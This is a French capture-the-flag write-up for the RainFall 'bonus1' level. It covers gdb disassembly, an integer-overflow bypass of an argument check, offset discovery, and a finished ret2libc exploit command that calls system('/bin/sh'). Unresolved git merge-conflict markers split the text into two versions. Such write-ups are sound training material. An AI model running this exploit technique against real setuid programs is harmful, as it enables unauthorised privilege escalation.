<<<<<<< HEAD
test du programme

			bonus1@RainFall:~$ ls
			bonus1
			bonus1@RainFall:~$ ./bonus1 
			Segmentation fault (core dumped)
			bonus1@RainFall:~$ ./bonus1 "toto"
			bonus1@RainFall:~$ ./bonus1 0123456789

on utilise gdb

			(gdb) disas main
			Dump of assembler code for function main:
			   0x08048424 <+0>:	push   %ebp
			   0x08048425 <+1>:	mov    %esp,%ebp
			   0x08048427 <+3>:	and    $0xfffffff0,%esp
			   0x0804842a <+6>:	sub    $0x40,%esp
			   0x0804842d <+9>:	mov    0xc(%ebp),%eax
			   0x08048430 <+12>:	add    $0x4,%eax
			   0x08048433 <+15>:	mov    (%eax),%eax
			   0x08048435 <+17>:	mov    %eax,(%esp)
			   0x08048438 <+20>:	call   0x8048360 <atoi@plt>
			   0x0804843d <+25>:	mov    %eax,0x3c(%esp)
			   0x08048441 <+29>:	cmpl   $0x9,0x3c(%esp)
			   0x08048446 <+34>:	jle    0x804844f <main+43>
			   0x08048448 <+36>:	mov    $0x1,%eax
			   0x0804844d <+41>:	jmp    0x80484a3 <main+127>
			   0x0804844f <+43>:	mov    0x3c(%esp),%eax
			   0x08048453 <+47>:	lea    0x0(,%eax,4),%ecx
			   0x0804845a <+54>:	mov    0xc(%ebp),%eax
			   0x0804845d <+57>:	add    $0x8,%eax
			   0x08048460 <+60>:	mov    (%eax),%eax
			   0x08048462 <+62>:	mov    %eax,%edx
			   0x08048464 <+64>:	lea    0x14(%esp),%eax
			   0x08048468 <+68>:	mov    %ecx,0x8(%esp)
			   0x0804846c <+72>:	mov    %edx,0x4(%esp)
			   0x08048470 <+76>:	mov    %eax,(%esp)
			   0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
			   0x08048478 <+84>:	cmpl   $0x574f4c46,0x3c(%esp)
			   0x08048480 <+92>:	jne    0x804849e <main+122>
			   0x08048482 <+94>:	movl   $0x0,0x8(%esp)
			   0x0804848a <+102>:	movl   $0x8048580,0x4(%esp)
			   0x08048492 <+110>:	movl   $0x8048583,(%esp)
			   0x08048499 <+117>:	call   0x8048350 <execl@plt>
			   0x0804849e <+122>:	mov    $0x0,%eax
			   0x080484a3 <+127>:	leave  
			   0x080484a4 <+128>:	ret    
			End of assembler dump.
			(gdb) 
=======
En utilisant gdb on voit que:
    - le code prend 2 argument
    - vérifie que le premier est inférieur à 10
    - le multiplie par 4 et le stock dans une variable
    - fais un memcpy d'un buffer de 40 et du deuxième argument
    - lance un shell si la variable contenant le premier argument est égal à 0x574f4c46

Il y a un memcpy qu'on va donc utilsier pour un bufferoverflow
Le code contient bien "/bin/sh" et system

On peut donc faire une ret2libc attack.

On recherche en premier l'offset.

On va regarder l'etat de ECX à l'endroit ou est stock notre input*4
soit main+79

UINT_MAX    =  4294967295
UINT_MAX/4  =  1073741823

On va donc essayer avec -1073741823 (car notre programme ne peut pas fonctionner avec des nombres supérieur à 9)

gdb bonus1
(gdb) b *main+79
(gdb)  r -1073741823 test
(gdb) p $ecx
$1 = 4

Donc -1073741823 est égal à 1 pour notre programme, ce qui nous donne 4 car 1*4 = 4

On va donc ajouter plu que 10 à -1073741823, pour overflow notre buffer
On prend donc -1073741800

On utilise un buffer overflow pattern generator.

(gdb)  r -1073741800 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Program received signal SIGSEGV, Segmentation fault.
0x39624138 in ?? ()

On a donc notre offset au byte 56.
On peut commencer à chercher les adresses de system et /bin/sh pour notre exploit.

(gdb) info function system
All functions matching regular expression "system":

Non-debugging symbols:
0xb7e6b060  __libc_system
0xb7e6b060  system
0xb7f49550  svcerr_systemerr

L'adresse de system est 0xb7e6b060

(gdb) find &system,+9999999,"/bin/sh"
0xb7f8cc58
warning: Unable to access target memory at 0xb7fd3160, halting search.
1 pattern found.

L'adresse de /bin/sh est 0xb7f8cc58


On peut maintenant créer notre exploit:

./bonus1 -1073741803 `python -c 'print "A" * 56 + "\x60\xb0\xe6\xb7" + "AAAA" +"\x58\xcc\xf8\xb7"'`
>>>>>>> 8669a7e5fb63edf774e5a6592acdd662f0a136bf
